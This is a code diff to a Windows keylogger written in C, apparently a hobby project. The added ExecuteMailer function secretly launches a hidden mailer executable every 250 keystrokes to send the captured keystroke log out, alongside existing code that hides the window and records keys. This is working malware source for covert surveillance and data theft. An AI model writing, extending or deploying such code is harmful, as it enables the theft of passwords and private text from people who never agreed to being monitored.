@@ -3,6 +3,7 @@
 #include <string.h>
 #include <time.h>
 #include <windows.h>
+#include <process.h>
 
 // GLOBALS
 #define BUF_SIZE 256 // general purpose for buffers
@@ -13,6 +14,7 @@ char* GetTime();
 void HideWindow();
 void InitLogfile(char* filename);
 void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_logfile);
+void ExecuteMailer();
 void KeystrokeHandler(short key, FILE* logfile);
 
 // MAIN FUNCTION //
@@ -54,7 +56,7 @@ int main(){
                 // once logfile large enough, execute mailer
                 if(keystroke_count >= 250){
                     //Execute mailer.py
-                    
+                    ExecuteMailer();
                     keystroke_count = 0;
                     InitLogfile(filename);
                 }
@@ -123,6 +125,28 @@ void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_lo
     }
 }
 
+// executes mailer module to send logfile
+void ExecuteMailer(){
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE; // hide new executable window
+    PROCESS_INFORMATION pi;
+    
+    // win32 version of fork() and exec()
+    CreateProcess(
+        "C:\\Users\\Logan\\Documents\\Programming\\Simple-Keylogger\\mailer.exe",
+        NULL, NULL, NULL,
+        FALSE,
+        CREATE_NO_WINDOW,
+        NULL, NULL,
+        &si, &pi
+    );
+
+    // wait for child process to complete to prevent emailing emptied logfile
+    WaitForSingleObject(&pi, INFINITE);
+    CloseHandle(&pi);
+}
 // writes to file the interpretation of keystroke
 void KeystrokeHandler(short key, FILE* logfile){
     // upper case alphabet
